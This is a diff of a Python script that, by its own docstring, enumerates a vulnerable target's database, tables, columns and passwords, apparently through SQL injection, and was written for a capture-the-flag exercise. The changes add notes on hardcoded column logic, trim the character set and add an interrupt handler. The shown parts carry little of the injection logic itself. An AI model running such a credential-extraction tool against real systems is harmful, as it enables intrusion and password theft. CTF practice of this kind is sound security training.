@@ -2,13 +2,19 @@
 This script will enumerate a vulnerable target to identify database, table, column names, and passwords.
 
 The "charset" value can be modified to any string you choose and the script will enumerate through it.
+
+Contains some hardcoded logic, like expecting a 4 values for select. Need to adjust this. 
+The reason is that this was made for a CTF where the database had this logic.
+Could just add a function which determines the amount of columns for select.
+
+Could be improved for handling network errors or unexpected results.
 """
 import requests
 import sys
 import argparse
 
 def enum_db(url, db_name="", table_name="", column_name="", column_enum="", username="", success_str="Welcome", username_col="username", enum_value=False, known_values=None, union_columns=4):
-    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _@.-!#$%&*()[]{};:'\",?/~`^+=|\\"
+    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _@.-!#$&*()[]{};:'\",?/~`^+=|\\"
 
     length = len(charset)
     i = 0
@@ -171,4 +177,7 @@ def main():
                 prompt_and_enumerate_password(url, db_name, table_name, columns, success_str, union_columns)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n\tBye!\n")
